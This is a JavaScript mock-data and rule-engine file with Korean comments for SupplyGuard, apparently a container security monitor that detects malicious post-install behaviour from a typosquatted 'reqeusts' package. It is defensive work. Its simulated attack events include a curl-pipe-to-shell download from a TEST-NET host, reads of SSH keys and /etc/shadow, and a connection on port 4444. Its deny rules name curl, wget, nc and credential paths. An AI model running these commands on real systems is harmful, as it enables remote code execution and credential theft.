// SupplyGuard 목업 — 시드 고정 더미 데이터와 규칙 평가.
// 스키마는 backend/internal/model(Event·Verdict), rules(Rule), stats(Snapshot) 와 같다.
// 주소는 TEST-NET(203.0.113.0/24)·사설 대역만 쓴다. 외부 라이브러리 없음.
(function () {
  'use strict';

  // ── 결정적 난수 (mulberry32) — 새로고침해도 같은 감사 로그·추이가 나온다
  function mulberry32(seed) {
    return function () {
      seed |= 0; seed = (seed + 0x6D2B79F5) | 0;
      let t = Math.imul(seed ^ (seed >>> 15), 1 | seed);
      t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
      return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
    };
  }
  const seeded = mulberry32(20260929);
  const hexId = (rnd, n) => { let s = ''; for (let i = 0; i < n; i++) s += '0123456789abcdef'[Math.floor(rnd() * 16)]; return s; };

  // ── 관찰 대상 컨테이너 (backend/internal/ingestion/mock.go 와 같은 구성)
  const containers = [
    { name: 'web-api', image: 'node:22-alpine', attacker: false, normal: [
      { kind: 'exec', comm: 'node', args: 'node /app/server.js' },
      { kind: 'open', comm: 'node', path: '/app/node_modules/express/index.js' },
      { kind: 'open', comm: 'node', path: '/etc/hosts' },
      { kind: 'connect', comm: 'node', dstIp: '172.18.0.4', dstPort: 5432 },
      { kind: 'connect', comm: 'node', dstIp: '104.16.2.35', dstPort: 443, dstHost: 'api.github.com' },
    ] },
    { name: 'worker', image: 'python:3.12-slim', attacker: false, normal: [
      { kind: 'exec', comm: 'python3', args: 'python3 -m worker' },
      { kind: 'open', comm: 'python3', path: '/usr/local/lib/python3.12/json/__init__.py' },
      { kind: 'open', comm: 'python3', path: '/tmp/job-queue.lock' },
      { kind: 'connect', comm: 'python3', dstIp: '172.18.0.5', dstPort: 6379 },
    ] },
    { name: 'pkg-reqeusts', image: 'demo/reqeusts:1.0.2', attacker: true, normal: [
      { kind: 'exec', comm: 'python3', args: 'python3 -c import reqeusts' },
      { kind: 'open', comm: 'python3', path: '/usr/local/lib/python3.12/site-packages/reqeusts/__init__.py' },
      { kind: 'connect', comm: 'python3', dstIp: '151.101.0.223', dstPort: 443, dstHost: 'files.pythonhosted.org' },
    ] },
  ];

  // 데모 시나리오 1~3 (docs/00-개발-계획.md §7) — 타이포스쿼팅 패키지의 post-install 행위
  const attack = [
    { kind: 'exec', comm: 'sh', args: 'sh -c curl -s http://203.0.113.7/p.sh | sh' },
    { kind: 'exec', comm: 'curl', args: 'curl -s http://203.0.113.7/p.sh' },
    { kind: 'open', comm: 'python3', path: '/root/.ssh/id_rsa' },
    { kind: 'open', comm: 'python3', path: '/etc/shadow' },
    { kind: 'connect', comm: 'python3', dstIp: '203.0.113.7', dstPort: 8081, dstHost: 'cdn.reqeusts-update.test' },
    { kind: 'connect', comm: 'sh', dstIp: '203.0.113.7', dstPort: 4444, dstHost: 'cdn.reqeusts-update.test' },
  ];

  // ── 기본 정책 (backend/policies/default.yaml)
  const rules = [
    { id: 'sensitive-files', description: '자격 증명·계정 파일 접근 (데모 시나리오 2)', kind: 'open', action: 'kill',
      denyPaths: ['/etc/shadow', '/etc/gshadow', '/root/.ssh/', '/home/*/.ssh/*', '/root/.aws/', '/var/run/secrets/'] },
    { id: 'no-shell-download', description: '설치 스크립트 없이 컨테이너 안에서 외부 스크립트 내려받기 (데모 시나리오 1)', kind: 'exec', action: 'kill',
      denyComms: ['wget', 'curl', 'nc', 'ncat'] },
    { id: 'pipe-to-shell', description: '내려받은 내용을 바로 셸에 넘기는 패턴', kind: 'exec', action: 'kill',
      denyArgs: ['| sh', '|sh', '| bash', '|bash', 'base64 -d'] },
    { id: 'reverse-shell-ports', description: '리버스 셸에 흔한 포트로 나가는 연결', kind: 'connect', action: 'kill',
      denyPorts: [4444, 1337, 31337] },
    { id: 'egress-allowlist', description: '내부망이 아니면서 허용 포트(HTTP·HTTPS·DNS)도 아닌 아웃바운드 연결 (데모 시나리오 3)', kind: 'connect', action: 'alert',
      allowPorts: [80, 443, 53], allowCidrs: ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16', '127.0.0.0/8', '::1'] },
    { id: 'sandbox-egress', description: '설치 샌드박스는 패키지 레지스트리·GitHub 외 아웃바운드를 금지 (도메인은 DNS 응답으로 확인)', kind: 'connect', action: 'kill', containers: ['sg-install-*'],
      allowHosts: ['pypi.org', 'pythonhosted.org', 'registry.npmjs.org', 'registry.yarnpkg.com', 'crates.io', 'github.com', 'githubusercontent.com', 'deb.debian.org', 'dl-cdn.alpinelinux.org'],
      allowCidrs: ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16', '127.0.0.0/8'] },
    { id: 'sandbox-secrets', description: '설치 스크립트가 자격 증명·토큰·설정 파일에 손대면 격리', kind: 'open', action: 'kill', containers: ['sg-install-*'],
      denyPaths: ['/root/.ssh/', '/root/.aws/', '/root/.npmrc', '/root/.pypirc', '/root/.netrc', '/root/.gitconfig', '/root/.docker/', '/run/secrets/'] },
  ];

  // ── 규칙 평가 (backend/internal/rules/engine.go 의 축약판: 가장 강한 대응 우선, allow 먼저)
  const globToRe = (g) => new RegExp('^' + g.replace(/[.+^${}()|\\]/g, '\\$&').replace(/\*/g, '[^/]*').replace(/\?/g, '.') + '$');
  const isGlob = (s) => /[*?[\]]/.test(s);
  const matchPath = (pat, path) => (isGlob(pat) ? globToRe(pat).test(path) : path.startsWith(pat));
  const matchName = (pat, name) => (isGlob(pat) ? globToRe(pat).test(name) : pat === name);
  function ipToInt(ip) { const p = ip.split('.').map(Number); return p.length === 4 && p.every((n) => n >= 0 && n <= 255) ? ((p[0] << 24) | (p[1] << 16) | (p[2] << 8) | p[3]) >>> 0 : null; }
  function inCidr(ip, cidr) {
    if (cidr === ip) return true;
    const [net, bitsStr] = cidr.split('/');
    const a = ipToInt(ip), b = ipToInt(net);
    if (a === null || b === null) return false;
    const bits = bitsStr === undefined ? 32 : Number(bitsStr);
    const mask = bits === 0 ? 0 : (~0 << (32 - bits)) >>> 0;
    return (a & mask) === (b & mask);
  }
  const strength = (r) => (r.action === 'kill' ? (r.dryRun ? 2 : 3) : 1);

  function ruleHits(r, e) {
    if (r.disabled || r.kind !== e.kind) return null;
    if (r.containers && r.containers.length && !r.containers.some((g) => matchName(g, e.containerName) || matchName(g, e.imageName))) return null;
    switch (e.kind) {
      case 'exec': {
        const argv0 = (e.args || '').split(' ')[0].split('/').pop();
        const c = (r.denyComms || []).find((x) => x === e.comm || x === argv0);
        if (c) return `금지 프로세스 ${c} 실행`;
        const a = (r.denyArgs || []).find((x) => (e.args || '').includes(x));
        if (a) return `금지 인자 패턴 "${a}"`;
        return null;
      }
      case 'open': {
        if ((r.allowPaths || []).some((p) => matchPath(p, e.path || ''))) return null;
        const d = (r.denyPaths || []).find((p) => matchPath(p, e.path || ''));
        return d ? `금지 경로 ${d} 접근` : null;
      }
      case 'connect': {
        const ip = e.dstIp || '', port = e.dstPort, host = (e.dstHost || '').toLowerCase().replace(/\.$/, '');
        const hostMatch = (pat) => { pat = pat.toLowerCase().replace(/\.$/, ''); return host && (host === pat || host.endsWith('.' + pat)); };
        if ((r.denyPorts || []).includes(port)) return `금지 포트 ${port}`;
        const dc = (r.denyCidrs || []).find((c) => inCidr(ip, c));
        if (dc) return `금지 대역 ${dc}`;
        const dh = (r.denyHosts || []).find(hostMatch);
        if (dh) return `금지 도메인 ${dh}`;
        const hasAllow = (r.allowPorts || []).length || (r.allowCidrs || []).length || (r.allowHosts || []).length;
        if (!hasAllow) return null;
        if ((r.allowPorts || []).includes(port) || (r.allowCidrs || []).some((c) => inCidr(ip, c)) || (r.allowHosts || []).some(hostMatch)) return null;
        const dst = host ? `${ip}:${port} (${host})` : `${ip}:${port}`;
        return (r.allowHosts || []).length && !host ? `허용 목록 밖 목적지 ${dst} — 도메인 미확인` : `허용 목록 밖 목적지 ${dst}`;
      }
    }
    return null;
  }

  // evaluate: 이벤트 → Verdict (enforced 는 파이프라인이 채운다)
  function evaluate(rs, e) {
    let best = null, why = '';
    for (const r of rs) {
      const hit = ruleHits(r, e);
      if (hit && (!best || strength(r) > strength(best))) { best = r; why = hit; }
    }
    if (!best) return { event: e, matched: false };
    const v = { event: e, matched: true, ruleId: best.id, action: best.action, reason: `${best.id}: ${why}` };
    if (best.action === 'kill' && best.dryRun) v.dryRun = true;
    return v;
  }

  // ── 과거 감사 로그 (위반만 저장됨) — 최근 24시간, 6~7분 간격의 공격 버스트
  function buildAudit(now) {
    const rows = [];
    let id = 1;
    const cids = containers.map(() => hexId(seeded, 64));
    for (let i = 0; i < 220; i++) {
      const at = now - (i * 6.5 + seeded() * 3) * 60000;
      const evs = attack.slice(0, 2 + Math.floor(seeded() * 5));
      const c = containers[2];
      let enforced = false;
      for (const a of evs) {
        const e = Object.assign({ timestamp: new Date(at + rows.length % 3 * 40).toISOString(), containerId: cids[2], containerName: c.name, imageName: c.image, pid: 1000 + Math.floor(seeded() * 30000) }, a);
        const v = evaluate(rules, e);
        if (!v.matched) continue;
        if (v.action === 'kill') { v.enforced = true; enforced = true; }
        v.id = id++;
        rows.push(v);
      }
      if (!enforced && seeded() < 0.15) {
        // 가끔 다른 컨테이너의 경고성 egress
        const c2 = containers[Math.floor(seeded() * 2)];
        const e = { kind: 'connect', comm: c2.name === 'web-api' ? 'node' : 'python3', timestamp: new Date(at + 900).toISOString(), containerId: cids[c2 === containers[0] ? 0 : 1], containerName: c2.name, imageName: c2.image, pid: 2000 + Math.floor(seeded() * 900), dstIp: '203.0.113.42', dstPort: 8443 };
        const v = evaluate(rules, e); v.id = id++; rows.push(v);
      }
    }
    // 최신순, id 는 시간 오름차순이 되도록 다시 매긴다
    rows.sort((a, b) => new Date(a.event.timestamp) - new Date(b.event.timestamp));
    rows.forEach((r, i) => { r.id = i + 1; });
    return rows.reverse();
  }

  window.MOCK = { containers, attack, rules, evaluate, buildAudit, hexId, seeded };
})();
